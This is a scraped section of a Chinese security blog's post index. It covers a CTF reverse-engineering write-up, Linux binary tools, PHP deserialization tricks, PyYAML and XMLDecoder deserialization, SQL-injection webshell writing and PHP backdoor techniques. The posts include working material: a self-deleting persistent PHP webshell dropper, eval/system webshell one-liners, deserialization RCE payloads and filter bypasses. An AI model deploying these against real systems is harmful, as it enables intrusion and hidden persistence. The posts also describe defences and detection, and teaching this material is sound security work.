AccountServiceImpl implements AccountService &#123; private AccountDao accountDao; public void setAccountDao(AccountDao accountDao) &#123; this.accountDao = accountDao; &#125; public void transfer(String outUser, String inUser, int money) &#123; this.accountDao.out(outUser, money); this.accountDao.in(inUser, money); &#125;&#125; 运行MainApp之后，效果和前面的是一样的。","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"HITB Binary 100 writeup","date":"2018-12-31T17:01:01.000Z","path":"2019/01/01/HITB_Binary_100_writeup/","text":"HITB Binary 100是之前的HITB CTF的一道简单的逆向题，这里简单做一遍。 下载hitb-bin100.elf 将elf文件先跑一下，发现像歌词播放一样、每个一秒钟左右输出一句话，歌词好像没啥用，而且运行很久也还没停下来： 根据字符串检索法，扔到IDA的String窗口查看是否存在关键字符串，可以看到有“FLAG”相关的字符串： 点击进去查看，发现这段代码是在main()函数中的： 接着查看一下该二进制文件的函数等信息： 在Function Window也可以看到，除了调用一些标准库的函数，整个程序几乎都编译到了main函数中： 查看main函数的汇编代码，可以看到有两个地址值得研究，即4007e8和400803，因为其中都是会调用printf函数输出内容： 直接在GDB上运行并jump到相应的地址查看： 可以看到，KEY是正常的输出出来了，但是FLAG输出的是一堆乱码，然后就出现“stack smashing detected”的错误而终止运行了。跳过去直接输出Flag是不可能的了。 F5看一下伪代码吧，看到在输出flag前一段主要的代码： 分析可知，v20变量存放的是该循环执行的次数、无法改变；v21变量调用time函数生成一个时间戳，用于后续与v6变量的相减形成随机种子值；v11变量用于内循环执行的次数，从0-36；v6变量同样调用time函数生成一个时间戳，与v21变量不同在于每次内循环结束后重新生成时间戳时都会先sleep 1s后再生成；在内循环的最后是一个sleep()函数，调用来休眠1s；其余的代码都是用于生成输出的字符串。 这里如果想直接nop掉sleep()函数是行不通的，因为整段代码的执行依赖于该sleep()函数，v6与v21的差值在每次内循环结束的时候都会通过sleep()函数实现增一，如果不这样正常处理，将得不到正常的flag。 换个思路，这里关键的两个函数是sleep()和time()，我们可以重新定义该两个函数，通过LD_PRELOAD预先加载这两个函数而不是调用系统自己的从而实现欺骗程序该代码确实是睡眠了1s了，也就是说，自定义的sleep()函数直接对时间变量t自增1而不是真的等待了一秒才运行结束，从而可以将程序的休眠时间去掉： gcc编译为so文件（-fpic参数指定为位置无关、即使用相对地址，-shared参数指定为共享库），再通过LD_PRELOAD在该elf程序运行前优先加载生成的动态链接库time.so并管道输出到一个文件中查看，可以看到输出了flag：","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"}]},{"title":"Linux环境与相关工具","date":"2018-12-31T17:01:01.000Z","path":"2019/01/01/Linux环境与相关工具/","text":"这里小结一下Linux二进制分析相关的环境与工具的基础知识。 Linux工具Linux自带了很多常用的binutils工具，这些工具可在以下的URL中找到，其中包含许多用于二进制分析和破解的工具：http://www.gnu.org/software/binutils/ GDBGNU Debuger，具体的不用多说。 GNU binutils中的objdumpobject dump是一种对代码进行快速反编译的简介方案，在反编译简单的、未被篡改的二进制文件时较为有用，可以读取常用的ELF类型文件，但对于如恶意软件等较为复杂的反编译任务则显得局限。 主要缺点是需要依赖ELF节头，并且不会进行控制流分析。 一些常见用例： 查看ELF文件中所有节的数据或代码： objdump -D \\ 只查看ELF文件中的程序代码： objdump -d \\ 查看所有符号： objdump -tf \\ GNU binutils中的objcopyobject copy将目标文件的一部分或者全部内容拷贝到另外一个目标文件中，或者实现目标文件的格式转换。其可以分析和修改任意类型的ELF文件，修改ELF节，复制ELF节到ELF二进制中或反之。 要将.data节从一个ELF文件复制到另一个文件中可用以下命令： objcopy -only-section=.data \\ \\ stracesystem call trace系统调用追踪，是基于ptrace(2)系统调用的工具，通过在一个循环中使用PTRACE_SYSCALL请求来显示运行中程序的系统调用syscalls活动相关的信息以及程序执行中捕获到的信号量。 跟踪程序： strace /bin/ls -o ls.out 附加到一个现存的进程上： strace -p \\ -o daemon.out 原始输出将会显示每个系统调用的文件描述编号，系统调用会将文件描述符作为参数，如下： SYS_read(3, buf, sizeof(buf)); 若想查看读入到文件描述符3中的所有数据，可执行如下命令： strace -e read=3 /bin/ls 也可以使用-e write=fd命令查看写入的数据。 ltracelibrary trace库追踪，与strace类似，用于解析共享库即一个程序的链接信息，并打印出用到的库函数。还可以使用-S参数查看系统调用。该命令通过解析可执行文件的动态段，并打印出共享库和静态库的实际符号和函数来提供更详细的信息。 ltrace \\ -o program.out ftracefunction trace函数追踪，与ltrace类似，另外还可以查看二进制文件本身的函数调用，可以在以下URL下载：https://github.com/elfmaster/ftrace readelfreadelf是用于解析ELF二进制文件的工具。在进行反编译之前，需要手机目标文件相关的信息，该命令可以提供收集信息所需要的特定的ELF的所有数据。 查询节头表：readelf -S \\ 查询程序头表：readelf -l \\ 查询符号表：readelf -s \\ 查询ELF文件头数据：readelf -e \\ 查询重定位入口：readelf -r \\ 查询动态段：readelf -d \\ ERESI——ELF反编译系统接口ERESI工程包含了许多Linux二进制工具，具体查看http://www.eresi-project.org 设备和文件/proc/&lt;pid&gt;/maps/proc/\\/maps文件保存了一个进程镜像的布局，通过展现每个内存映射来实现，展现的内容包括可执行文件、共享库、栈、堆和VDSO等。对于快速解析一个进程的地址空间分布十分有用。 /proc/kcore/proc/kcore是proc文件系统的一项，是Linux内核的动态核心文件，是以ELF核心文件的形式所展现出来的原生内存转储。GDB可以使用/proc/kcore来对内核进行调试分析。 /boot/System.map该文件几乎存在于所有的Linux版本中，包含了整个内核的所有符号。 /proc/kallsyms/proc/kallsyms与/boot/System.map类似，/proc/kallsyms包含了内核中绝大部分的符号（若在CONFIG_KALLSYMS_ALL内核配置中指明则可以包含内核中全部的符号），区别是kallsyms是内核所属的/proc的一个入口并且可以动态更新。假如安装了新的LKM（Linux Kernel Module），符号会自动添加到/proc/kallsyms中。 /proc/iomem/proc/iomem是一个proc入口，与/proc/\\/maps类似，不过其是跟系统内存相关的。 例如，查询内核的text段所映射的物理内存位置，通过搜索Kernel便可以查看code/text段、data段和bss段的内容： ECFSExtended Core File Snapshot扩展核心文件快照，是一种核心转储技术，专门为进程镜像的高级取证分析所设计。可从该URL下载：https://github.com/elfmaster/ecfs 链接器相关环境指针LD_PRELOAD环境变量LD_PRELOAD环境变量可以设置成一个指定库的路径，动态链接时较其他库有着更高的优先级，允许预加载指定库中的函数和符号覆盖掉后续链接的库中的函数和符号。即可以通过重定向共享库函数来进行运行时修复。这项技术可用于绕过反调试代码，也可以用作用户机rootkit。 CTF中有示例参考HITB Binary 100。 LD_SHOW_AUXV环境变量LD_SHOW_AUXV环境变量能够通知程序加载器来展示程序运行时的辅助向量。辅助向量是放在程序栈上的信息（通过内核的ELF常规加载方式），附带了传递给动态链接器的程序相关的特定信息。 链接器脚本链接器脚本由链接器解释，把程序划分为节、内存和符号。gcc通过使用-T参数来指定链接器脚本。默认的链接器脚本可以使用ld –verbose命令查看：","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"}]},{"title":"PHP内存型木马","date":"2018-12-31T17:01:01.000Z","path":"2019/01/01/PHP内存型木马/","text":"基本概念PHP内存性木马即PHP不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。 通常在AWD Web题中用得较多。 Demo及原理nodie.php 123456789101112&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '/var/www/dvwa/.ski12.php'; $code = '&lt;?php if(md5($_POST[\"pass\"])==\"cdd7b7420654eb16c1e1b748d5b7c5b8\")&#123;@system($_POST[a]);&#125;?&gt;'; while (1) &#123; file_put_contents($file, $code); system('touch -m -d \"2018-12-01 09:10:12\" .ski12.php'); usleep(5000); &#125;?&gt; 简单分析： ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。 set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。 unlink(__FILE__)删除文件本身，以起到隐蔽自身的作用。 while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过“find –name \\’*.php\\’ –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。 至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。 这里以DVWA为示例： 先找到上传点上传nodie.php： 访问文件所在路径让其执行，等待一会发现404，该文件不存在： 一般而言分两种情况，一种是乐观的、即文件执行成功且删除了自身、生成了隐蔽的后门；另一种是被干掉了。直接访问我们设置生成的隐蔽后门的路径检测一下是否真的生成了后门文件： 虽然没有返回，但确实存在该文件，接着直接利用即可： 以运维的视角尝试删除文件，发现删不掉： 查杀方法1、如果允许，重启服务是万能的； 2、其次，最好的解决方案是kill掉www-data用户的所有子进程： ps aux | grep www-data | awk ‘{print $2}’ | xargs kill -9 3、创建一个和不死马生成的马一样名字的目录； 4、编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。简单示例： 12345678&lt;?phpwhile (1) &#123; $pid = 不死马的进程PID; @unlink(\".ski12.php\"); exec(\"kill -9 $pid\"); usleep(1000);&#125;?&gt;","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"AWD","slug":"AWD","permalink":"https://www.mi1k7ea.com/tags/AWD/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"PHP unserialize反序列化漏洞","date":"2018-12-31T17:01:01.000Z","path":"2019/01/01/PHP反序列化漏洞/","text":"0x01 PHP的序列化与反序列化简介PHP官方文档中说到：所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 通常我们定义了一个类的对象，其中保存了一些属性值，为了方便下次可以继续使用在这个对象或者在其他的文件中可以使用该对象，于是就可以调用serialize()函数将该对象序列化为字符串的形式，将该字符串保存起来，等到需要使用该对象时只需将该字符串传过去并调用unserialize()函数对其反序列化即可。 serialize()：将一个对象转成字符串形式，方便保存以便于下次再次反序列化出该对象直接使用。 unserialize()：将序列化后的字符串反序列化成一个对象。 PHP序列化主要是调用serialize()函数实现对指定对象的序列化操作。 demo.php： 123456789101112131415161718192021&lt;?phpclass Test&#123; public $name; public $blog;&#125;$test = new Test();$test-&gt;name = \"Mi1k7ea\";$test-&gt;blog = \"https://www.mi1k7ea.com\";echo \"创建对象并给其属性赋值：&lt;br&gt;\";foreach($test as $key =&gt; $value) &#123; echo $key.\" =&gt; \".$value.\"&lt;br&gt;\";&#125;$str = serialize($test);echo \"&lt;br&gt;对象序列化后的字符串：\".$str;$f = fopen('test.txt', 'w');fwrite($f, $str);fclose($f);?&gt; 运行后，可以看到创建的对象序列化后的字符串： PHP反序列化主要是调用unserialize()函数实现对指定序列化字符串进行反序列化为对象的操作。 demo2.php： 1234567891011&lt;?php$f = fopen(\"test.txt\", \"r\");$str = fread($f, filesize(\"test.txt\"));echo \"读取序列化的字符串：\".$str;echo \"&lt;br&gt;&lt;br&gt;经过反序列化后的结果如下：&lt;br&gt;\";$test = unserialize($str);foreach($test as $key =&gt; $value) &#123; echo $key.\" =&gt; \".$value.\"&lt;br&gt;\";&#125;?&gt; 运行后，可以看到反序列化后得到对象实例： 序列化字符串格式一般的，序列化字符串的格式为： 1变量类型:类名长度:类名:属性数量:&#123;属性类型:属性名长度:属性名;属性值类型:属性值长度:属性值内容&#125; 其中，常见的序列化数据类型标志如下： 标志 数据类型 i 整数 d 浮点数 O 对象 R 引用 S 字符串Hex s 字符串 a 数组 b 布尔值 N NULL 由前面的Demo可知，创建的对象序列化后的内容为： 1O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;Mi1k7ea&quot;;s:4:&quot;blog&quot;;s:23:&quot;https://www.mi1k7ea.com&quot;;&#125; 简单分析一下，“O”即Object对象，“4”为对象名的长度，“Test”即对象名，“2”为对象的属性个数；进入大括号为属性的内容，“s”即string字符串类型，“4”即该属性名的长度，“name”即该属性名，接着“;”分号间隔键值或不同属性，这里为间隔键和值，后续的同理分析。 PHP魔法函数PHP魔法函数包括但不限于如下表： 函数 说明 __construct() 构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作 __destruct() 析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行 __toString 当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串 __wakeup() 调用unserialize()时触发，反序列化恢复对象之前调用该方法，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。 __sleep() 调用serialize()时触发 ，在对象被序列化前自动调用，常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误 __call() 在对象上下文中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法 __callStatic() 在静态上下文中调用不可访问的方法时触发 __get() 用于从不可访问的属性读取数据，即在调用私有属性的时候会自动执行 __set() 用于将数据写入不可访问的属性 __isset() 在不可访问的属性上调用isset()或empty()触发 __unset() 在不可访问的属性上使用unset()时触发 __invoke() 当脚本尝试将对象调用为函数时触发 更多的PHP魔法函数可参考：https://www.php.net/manual/zh/language.oop5.magic.php 0x02 unserialize()反序列化漏洞基本原理PHP在进行反序列化操作时，若存在相应的魔法函数、unserialize()函数的参数可控且可以传递到魔法函数中执行相应的危险敏感操作，则会造成PHP反序列化漏洞的风险。 利用前提 unserialize()函数的参数可控； 代码中存在一个构造函数、析构函数、__wakeup()函数中有向php文件中写数据的操作的类或执行PHP代码或命令执行的类； 所写的内容需要有对象中的成员变量的值。 魔法函数调用次序一个简单的测试Demo： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass Vuln&#123; public $name; public $blog; function __construct()&#123; echo \"[*]调用__construct()&lt;br&gt;\"; &#125; function __destruct()&#123; echo \"[*]调用__destruct()&lt;br&gt;\"; &#125; function __wakeup()&#123; echo \"[*]调用__wakeup()&lt;br&gt;\"; &#125; function __sleep()&#123; echo \"[*]调用__sleep()&lt;br&gt;\"; return array('name', 'blog'); &#125; function __toString()&#123; echo \"[*]调用__toString()&lt;br&gt;\"; return $this-&gt;name.\" : \".$this-&gt;blog.\"&lt;br&gt;\"; &#125;&#125;echo \"开始初始化对象...&lt;br&gt;\";$test = new Vuln();$test-&gt;name = \"Mi1k7ea\";$test-&gt;blog = \"https://www.mi1k7ea.com\";echo \"创建对象并给其属性赋值：&lt;br&gt;\";foreach($test as $key =&gt; $value) &#123; echo $key.\" =&gt; \".$value.\"&lt;br&gt;\";&#125;echo \"开始序列化对象...&lt;br&gt;\";$str = serialize($test);echo \"对象序列化后的字符串：\".$str.\"&lt;br&gt;\";echo \"开始反序列化对象...&lt;br&gt;\";$str2 = unserialize($str);echo $str2;?&gt; 运行后可以看到各个魔法函数的调用次序： 反序列化漏洞Demovul_demo.php： 123456789101112&lt;?phpclass Vuln&#123; public $name; function __destruct()&#123; eval($this-&gt;name); &#125;&#125;$str = $_GET['p'];unserialize($str);?&gt; 然后根据利用前提条件，构造序列化的字符串payload访问即可： 12345678&lt;?phpclass Vuln&#123; public $name=\"phpinfo();\";&#125;echo serialize(new Vuln());?&gt; 输出如下，当然熟练的话就可以直接手写了： 1O:4:&quot;Vuln&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125; 或者是命令执行，只需将eval()换为system()等即可： 123456789101112&lt;?phpclass Vuln&#123; public $name; function __destruct()&#123; system($this-&gt;name); &#125;&#125;$str = $_GET['p'];unserialize($str);?&gt; POP链构造POP（Property-Oriented Programing）面向属性编程，常用于上层语言构造特定调用链的方法，与二进制利用中的ROP（Return-Oriented Programing）面向返回编程的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。 简单地说，PHP反序列化POP链和Java反序列化Gadget链是一个道理，就是一般在反序列化直接调用的魔法函数中可能不会存在明显的危险操作，但是在其中调用的某个函数的调用链中可能会触发危险操作，而构造出从PHP反序列化调用魔法函数进而调用到这条存在危险操作的函数调用链就称为POP链构造。 具体的POP链构造可参考文章：PHP对象注入之pop链构造 案例参考网上关于Typecho v1.0反序列化漏洞即可，这里可参考Kingkk大佬的博客：Typecho反序列化漏洞复现 0x03 __wakeup()绕过（CVE-2016-7124）影响版本 PHP 5 &lt; 5.6.25 PHP 7 &lt; 7.0.10 基本原理当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup()函数的执行。 Demowakeup_test.php： 1234567891011121314151617&lt;?phpclass Test&#123; public $name; function __wakeup()&#123; echo \"调用了__wakeup()&lt;br/&gt;\"; &#125; function __destruct()&#123; echo \"调用了__destruct()&lt;br/&gt;\"; echo \"反序列化得到的对象的name属性值为：$this-&gt;name\"; &#125;&#125;$str = $_GET['p'];unserialize($str);?&gt; 输入正常的对象属性个数O:4:&quot;Test&quot;:1:{s:4:&quot;name&quot;;s:7:&quot;Mi1k7ea&quot;;}，看到__wakeup()和析构函数都被调用了： 当输入对象属性个数&gt;真实属性个数即O:4:&quot;Test&quot;:2:{s:4:&quot;name&quot;;s:7:&quot;Mi1k7ea&quot;;}，看到__wakeup()就被绕过不执行了： 0x04 绕过Tricks针对PHP反序列化漏洞的过滤机制，可以使用如下一些Tricks来绕过。当然这些Tricks可以进行组合利用。 这里以前面反序列化Demo为例，其payload为： 1O:4:&quot;Vuln&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;whoami&quot;;&#125; 追加任意字符串序列化字符串之后追加任意字符串，不影响反序列化的进行： 1O:4:&quot;Vuln&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;whoami&quot;;&#125;test_by_mi1k7ea 长度前面添加0在序列化字符串中表示长度的数字前添加一个或者多个0，不影响反序列化的进行： 1O:4:&quot;Vuln&quot;:000001:&#123;s:0004:&quot;name&quot;;s:06:&quot;whoami&quot;;&#125; S数据类型的字符串Hex编码当将序列化字符串中数据类型从s改为S时，数据内容就可以从字符串变为字符串Hex形式了： 1O:4:&quot;Vuln&quot;:1:&#123;S:4:&quot;\\6e\\61\\6d\\65&quot;;S:6:&quot;\\77\\68\\6f\\61\\6d\\69&quot;;&#125; 该技巧在其他文章中提到过：PHP反序列化绕过限制Tricks 大概讲的是PHP序列化的时候private和protected变量会引入不可见字符\\x00，输出和复制的时候可能会遗失这些信息，导致反序列化的时候出错，利用该Trick就可以更加方便进行反序列化Payload的传输与显示，可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。这种Trick在CTF中也比较常见。 任意单个字符代替s之后的;在序列化字符串中使用任意单个字符代替s之后的分号，不影响反序列化的进行： 1O:4:&quot;Vuln&quot;:1:&#123;s:4:&quot;name&quot;Xs:6:&quot;whoami&quot;;&#125; 任意两个字符替换O之后的:{在序列化字符串中使用任意两个字符代替O之后的:{，不影响反序列化的进行： 1O:4:&quot;Vuln&quot;:1XXs:4:&quot;name&quot;;s:6:&quot;whoami&quot;;&#125; 数字前面添加+在序列化字符串中的数字前面添加+，不影响反序列化的进行： 1O:+4:&quot;Vuln&quot;:+1:&#123;s:+4:&quot;name&quot;;s:+6:&quot;whoami&quot;;&#125; 注意，在URL栏中输入记得对+号进行URL编码： 该技巧在其他文章中说到，并非只有O:后面才能加+，在数字类型前都可以添加：一道Bypass正则过滤的反序列化漏洞题目 数组中存储对象绕过O:开头限制PHP中可反序列化类型有String、Integer、Boolean、Null、Array、Object等。如果开头就限制了序列化类型不能为Object，那么可以使用Array类型来将之前的对象包含进来再进行序列化，具体还是看这里：一道Bypass正则过滤的反序列化漏洞题目 PoC生成代码中在序列化新对象之前用array()将对象转换为数组内的元素即可： 12345678&lt;?phpclass Vuln&#123; public $name=\"whoami\";&#125;echo serialize(array(new Vuln()));?&gt; 当然，熟练的话手写就可以了： 1a:1:&#123;i:0;O:4:&quot;Vuln&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;whoami&quot;;&#125;&#125; 0x05 防御方法 要严格控制unserialize()函数的参数，坚持用户所输入的信息都是不可靠的原则； 要对于反序列化后的变量内容进行检查，以确定内容没有被污染。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"Python安全小工具之反编译pyc文件","date":"2018-12-31T17:01:01.000Z","path":"2019/01/01/Python安全小工具之反编译pyc文件/","text":"有时需要查看某个Python Web目录内Python源码，但dump下来只有pyc文件而没有py文件，这时需要我们反编译pyc文件为py文件。为了方便就写个脚本遍历目录内的pyc文件并进行反编译。 1234567891011121314151617181920212223242526272829303132#coding=utf-8import osimport sysimport uncompyle6def Decompile(path): if os.path.exists(path): for parent,dirs,files in os.walk(path): for file in files: file_name,ext = os.path.splitext(file) if ext == \".pyc\": file_path = os.path.join(parent,file) print \"[*]Decompiling:\", file_path cmd = \"uncompyle6 \" + file_path + \" &gt; \" + parent + \"\\\\\" + file_name + \".py\" try: os.system(cmd) print \"[+]Decompile successful.\\n\" except Exception as e: print e print \"[*]Finished.\" else: print \"[-]Wrong Directory Path.\"def main(): if len(sys.argv) != 2: print \"[*]Usage: python decompile.py [Directory Path]\" else: path = sys.argv[1] Decompile(path)if __name__ == \"__main__\": main() 运行效果：","tags":[{"name":"安全开发","slug":"安全开发","permalink":"https://www.mi1k7ea.com/tags/安全开发/"},{"name":"Python","slug":"Python","permalink":"https://www.mi1k7ea.com/tags/Python/"}]},{"title":"Python PyYAML反序列化漏洞","date":"2018-12-31T17:01:01.000Z","path":"2019/01/01/PyYAML反序列化漏洞/","text":"基本概念（引用百度）YAML是“YAML不是一种标记语言”的外语缩写；但为了强调这种语言以数据做为中心，而不是以置标语言为重点，而用返璞词重新命名。它是一种直观的能够被电脑识别的数据序列化格式，是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。 PyYAML是Python中YAML语言的编辑器和解释器。 安装：pip install PyYAML 两个函数： yaml.dump()：将一个Python对象序列化生成为yaml文档。 yaml.load()：将一个yaml文档反序列化为一个Python对象。 简单的用例： 可以看到，User对象经过yaml序列化之后内容为一行字符串，简单解释一下：“!!pythonobject”为yaml标签，yaml.load()会识别该标签并调用相应的方法执行反序列化操作；冒号后面的“__main__”为py文件名，这里为本文件的意思；“User”为序列化的对象类型，后面紧跟的大括号即为该对象的属性及其属性值。 更详细的说明可参考官方文档。 Demo这里编写简单的Demo，一个py文件用于将恶意类序列化为字符串保存到yaml文件中，另一个py文件用于反序列化yaml文件内容为恶意类对象从而达到利用反序列化漏洞的目的。 yaml_test.py先创建一个poc对象再调用yaml.dump()将其序列化为一个字符串，其中第10行代码为将默认的“__main__”替换为该文件名“yaml_test”，目的是为了后面yaml.load()反序列化该字符串的时候会根据yaml文件中的指引去读取yaml_ test.py中的poc这个类，否则无法正确执行： yaml_test2.py直接yaml.load()读取目标yaml文件，由!!python/object标签解析其中的名为yaml_test的module中的poc类，最后执行了该类对象的__init__()方法从而执行了命令： 漏洞根源分析到$PYTHON_HOME/lib/site-packages/yaml/constructor.py中查看3个特殊Python标签的源码。 !!python/object标签： !!python/object/new标签： !!python/object/apply标签： 可以看到，!!python/object/new标签的代码实现其实就是!!python/object/apply标签的代码实现，只是最后newobj参数值不同而已。这3个Python标签中都是调用了make_python_instance()函数，查看该函数： 可以看到，在该函数是会根据参数来动态创建新的Python类对象或通过引用module的类创建对象，从而可以执行任意命令。 通用payload只要存在yaml.load()且参数可控，则可以利用yaml反序列化漏洞，payload列举如下，当然不止如下： 附上测试代码： 1234567891011import yamlpayload = '!!python/object/apply:subprocess.check_output [[calc.exe]]'#payload = '!!python/object/apply:subprocess.check_output [\"calc.exe\"]'#payload = '!!python/object/apply:subprocess.check_output [[\"calc.exe\"]]'#payload = '!!python/object/apply:os.system [\"calc.exe\"]'#payload = '!!python/object/new:subprocess.check_output [[\"calc.exe\"]]'#payload = '!!python/object/new:os.system [\"calc.exe\"]'yaml.load(payload) 一个疑问点？为什么“!!python/object”标签不好使，明明Demo用的是这个标签，但通用payload中无法执行该payload？看了一些网上的文章也没有分析原因，其实查看官方文档就知道怎么回事了： 可以看到，!!python/object标签的使用格式和另外两个根本就是两码事，其接收参数是使用大括号{}而非中括号[]，且并没有对参数args进行接收。也就是说，!!python/object标签只针对于对象类进行使用。 检测方法全局搜索Python代码中是否包含“import yaml”，若包含则进一步排查是否调用yaml.load()且参数是可控的。 防御方法使用安全函数yaml.safe_load()替代yaml.load()即可。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Python","slug":"Python","permalink":"https://www.mi1k7ea.com/tags/Python/"}]},{"title":"SQL注入写WebShell方式小结","date":"2018-12-31T17:01:01.000Z","path":"2019/01/01/SQL注入写WebShell方式小结/","text":"这里小结一下通过SQL注入写入WebShell的方法。 0x01 传统的SQL语句写shell通过SQL注入select into outfile实现，如： 11&apos; union select 1,&apos;&lt;?php eval($_POST[a]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;# 0x02 sqlmap写shell前提都是需要对目标目录具有写权限。 –os-cmd=”net user”交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。 –os-shell写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。 注意:关闭sqlmap文件就会被删除。 本地写入webshell先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，–file-write “./mst/mst.txt” –file-dest “网站的绝对路径/1.php”。 注意需要最高权限。 0x03 MySQL写一句话木马MySQL写木马，通常可以通过phpmyadmin来实现。 前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。 1、创建一个表 1CREATE TABLE a (cmd text NOT NULL); 2、插入数据 1INSERT INTO a (cmd) VALUES('&lt;?php eval($_POST['password']);?&gt;'); 3、导出一句话 1SELECT cmd from a into outfile '/var/www/tmp/webshell.php'; 4、删除表 1Drop TABLE IF EXISTS a; 0x04 SQL语句利用日志写shell看这篇文章：SQL语句利用日志写shell及相关绕过","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://www.mi1k7ea.com/tags/SQL注入/"}]},{"title":"Windows下的一种PHP隐藏后门姿势","date":"2018-12-31T17:01:01.000Z","path":"2019/01/01/Windows下的一种PHP隐蔽后门姿势/","text":"在Windows中的PHP解释环境中有两个函数能够自动加载文件，即auto_prepend_file和auto_append_file，其在php.ini中可修改成任意文件，可为PHP或DLL文件。将后门代码写入这两个文件，再修改include_path为后门文件的绝对路径，则Web站点下所有的PHP文件都可以作为PHP后门。 1、修改auto_prepend_file和auto_append_file： 在php.ini中找到这两个配置项，去掉注释，添加上后门文件名，如： 2、修改include_path： 在php.ini中找到该配置项，注意是Windows版本的，去掉注释并添加后门文件所在的绝对路径，如下： 3、创建后门文件： 在include_path指示的路径上创建auto_prepend_file和auto_append_file指定文件名的两个后门文件，如下： 之后直接使用菜刀带上密码访问Web站点任意一个PHP页面即可获取shell：","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"},{"name":"WebShell","slug":"WebShell","permalink":"https://www.mi1k7ea.com/tags/WebShell/"}]},{"title":"Java XMLDecoder反序列化漏洞","date":"2018-12-31T17:01:01.000Z","path":"2019/01/01/XMLDecoder反序列化漏洞/","text":"基本概念XMLDecoder用于将XMLEncoder创建的xml文档内容反序列化为一个Java对象，其位于java.beans包下。 影响版本XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。 Demo1234567891011121314151617181920212223242526272829303132333435363738394041import com.sun.beans.decoder.DocumentHandler;import org.xml.sax.helpers.DefaultHandler;import javax.xml.parsers.SAXParser;import javax.xml.parsers.SAXParserFactory;import java.io.BufferedInputStream;import java.io.File;import java.io.FileInputStream;import java.beans.XMLDecoder;public class test &#123; public static void XMLDecode_Deserialize(String path) throws Exception &#123; File file = new File(path); FileInputStream fis = new FileInputStream(file); BufferedInputStream bis = new BufferedInputStream(fis); XMLDecoder xd = new XMLDecoder(bis); xd.readObject(); xd.close(); &#125; public static void main(String[] args)&#123; //XMLDecode Deserialize Test String path = \"poc.xml\"; try &#123; XMLDecode_Deserialize(path);// File f = new File(path);// SAXParserFactory sf = SAXParserFactory.newInstance();// SAXParser sp = sf.newSAXParser();//// DefaultHandler dh = new DefaultHandler();// DocumentHandler dh = new DocumentHandler();// sp.parse(f, dh); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; Payload： poc.xml，可以看到java标签的class属性指定XMLDecoder类，对象标签指定ProcessBuilder类、void标签指定方法为start，即可调用ProcessBuilder.start()来执行其中的命令。 1234567891011&lt;?xml 